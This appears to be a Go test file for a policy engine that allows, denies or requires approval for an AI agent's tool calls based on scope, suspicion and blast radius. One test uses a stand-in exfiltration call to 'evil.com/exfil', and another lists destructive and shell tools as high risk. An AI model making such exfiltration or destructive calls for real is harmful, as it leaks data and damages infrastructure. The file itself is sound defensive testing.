package policy

import (
	"context"
	"encoding/json"
	"testing"
)

func TestEvaluate_AllowRead(t *testing.T) {
	e := &Engine{version: "test"}
	outcome, reason, _, err := e.Evaluate(context.Background(), Input{
		Session:   SessionSnapshot{DeclaredScope: []string{"read-only"}},
		Tool:      "fs.read",
		Arguments: json.RawMessage(`{"path":"/var/log/app.log"}`),
		Suspicion: 0.1,
	})
	if err != nil {
		t.Fatalf("Evaluate failed: %v", err)
	}
	if outcome != "ALLOW" {
		t.Errorf("expected ALLOW, got %s: %s", outcome, reason)
	}
}

func TestEvaluate_DenyWriteUnderReadOnly(t *testing.T) {
	e := &Engine{version: "test"}
	outcome, reason, _, _ := e.Evaluate(context.Background(), Input{
		Session:   SessionSnapshot{DeclaredScope: []string{"read-only"}},
		Tool:      "kubectl.delete",
		Arguments: json.RawMessage(`{"name":"test"}`),
		Suspicion: 0.1,
	})
	if outcome != "DENY" {
		t.Errorf("expected DENY for write under read-only, got %s: %s", outcome, reason)
	}
}

func TestEvaluate_DenyHighSuspicion(t *testing.T) {
	e := &Engine{version: "test"}
	outcome, reason, _, _ := e.Evaluate(context.Background(), Input{
		Session:   SessionSnapshot{DeclaredScope: []string{"read-only"}},
		Tool:      "fs.read",
		Arguments: json.RawMessage(`{}`),
		Suspicion: 0.90,
	})
	if outcome != "DENY" {
		t.Errorf("expected DENY for high suspicion, got %s: %s", outcome, reason)
	}
}

func TestEvaluate_DenyNetworkUnderNoNetwork(t *testing.T) {
	e := &Engine{version: "test"}
	outcome, reason, _, _ := e.Evaluate(context.Background(), Input{
		Session:   SessionSnapshot{DeclaredScope: []string{"no-network"}},
		Tool:      "http",
		Arguments: json.RawMessage(`{"url":"https://evil.com/exfil"}`),
		Suspicion: 0.1,
	})
	if outcome != "DENY" {
		t.Errorf("expected DENY for network under no-network, got %s: %s", outcome, reason)
	}
}

func TestEvaluate_RequireApprovalForDestructive(t *testing.T) {
	e := &Engine{version: "test"}
	outcome, reason, _, _ := e.Evaluate(context.Background(), Input{
		Session:   SessionSnapshot{DeclaredScope: []string{"write"}},
		Tool:      "terraform.destroy",
		Arguments: json.RawMessage(`{}`),
		BlastReport: map[string]interface{}{
			"destructive":       true,
			"criticality_score": 85.0,
		},
		Suspicion: 0.1,
	})
	if outcome != "REQUIRE_APPROVAL" {
		t.Errorf("expected REQUIRE_APPROVAL for destructive, got %s: %s", outcome, reason)
	}
}

func TestClassifyBlastClass_HighRisk(t *testing.T) {
	e := &Engine{version: "test"}
	cls := e.ClassifyBlastClass("kubectl.delete", json.RawMessage(`{}`))
	if cls != "high" {
		t.Errorf("expected 'high' for kubectl.delete, got %s", cls)
	}
}

func TestClassifyBlastClass_LowRisk(t *testing.T) {
	e := &Engine{version: "test"}
	cls := e.ClassifyBlastClass("fs.read", json.RawMessage(`{"path":"/tmp/test"}`))
	if cls != "low" {
		t.Errorf("expected 'low' for fs.read, got %s", cls)
	}
}

func TestClassifyBlastClass_ProdNamespace(t *testing.T) {
	e := &Engine{version: "test"}
	cls := e.ClassifyBlastClass("kubectl.get", json.RawMessage(`{"namespace":"prod"}`))
	if cls != "medium" {
		t.Errorf("expected 'medium' for prod namespace, got %s", cls)
	}
}

func TestClassifyBlastClass_AllHighRiskTools(t *testing.T) {
	e := &Engine{version: "test"}
	highRiskTools := []string{
		"kubectl.delete", "kubectl.apply", "kubectl.patch",
		"terraform.apply", "terraform.destroy",
		"iam.putPolicy", "iam.deleteRole",
		"shell.exec", "fs.write", "fs.delete",
		"cloud.instance.terminate", "cloud.securitygroup.delete",
	}
	for _, tool := range highRiskTools {
		cls := e.ClassifyBlastClass(tool, json.RawMessage(`{}`))
		if cls != "high" {
			t.Errorf("expected 'high' for %s, got %s", tool, cls)
		}
	}
}

func TestVersion(t *testing.T) {
	e := &Engine{version: "v0.1.0"}
	if v := e.Version(); v != "v0.1.0" {
		t.Errorf("expected v0.1.0, got %s", v)
	}
}

func TestNewEngine(t *testing.T) {
	ctx := context.Background()
	e, err := NewEngine(ctx, "testdata", "test")
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}
	if e.version != "test" {
		t.Errorf("expected version test, got %s", e.version)
	}
}

func TestNewEngineFromSource(t *testing.T) {
	ctx := context.Background()
	e, err := NewEngineFromSource(ctx, `package test`, "test-source")
	if err != nil {
		t.Fatalf("NewEngineFromSource failed: %v", err)
	}
	if e.version != "test-source" {
		t.Errorf("expected version test-source, got %s", e.version)
	}
}
